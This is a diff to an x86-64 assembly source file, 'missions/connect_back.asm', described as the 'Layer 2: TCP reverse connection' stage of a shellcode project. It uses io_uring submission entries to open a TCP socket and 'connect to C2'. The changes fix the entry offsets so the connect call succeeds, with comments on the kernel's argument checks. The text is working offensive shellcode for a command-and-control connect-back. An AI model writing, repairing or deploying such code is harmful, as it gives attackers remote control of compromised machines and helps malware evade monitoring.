@@ -1,6 +1,10 @@
 ; ================================================================
 ; missions/connect_back.asm — Layer 2: TCP reverse connection
 ; ================================================================
+; Reference source only — not assembled by the Makefile (it references
+; the Layer 0/1 labels of combined/shellcode.asm). The builder renders
+; the equivalent ops from the same base at build time.
+; ================================================================
 ; Sequence (all via io_uring):
 ;   1. IORING_OP_SOCKET  — create TCP socket
 ;   2. IORING_OP_CONNECT — connect to C2
@@ -29,7 +33,7 @@
 %define SQ_ADDR     16
 %define SQ_LEN      24
 %define SQ_OPFLAGS  28
-%define SQ_UDATA    40
+%define SQ_UDATA    32      ; u64 user_data — +32 (NOT +40, which is buf_index)
 
 %define AT_FDCWD    -100
 
@@ -63,7 +67,11 @@ _mission:
     mov [rax + SQ_FD], ecx
     lea rcx, [r13 + F_SADDR]
     mov [rax + SQ_ADDR], rcx
-    mov dword [rax + SQ_LEN], 16
+    ; CONNECT: addrlen goes in sqe->addr2 (SQ_OFF +8), NOT sqe->len (+24)
+    ; Kernel io_connect_prep: if (sqe->len || ...) return -EINVAL
+    push 0x10
+    pop rcx
+    mov [rax + SQ_OFF], rcx        ; addr2 = sizeof(sockaddr_in) = 16
     mov qword [rax + SQ_UDATA], 2
     call _io_enter
     call _wait_cqe
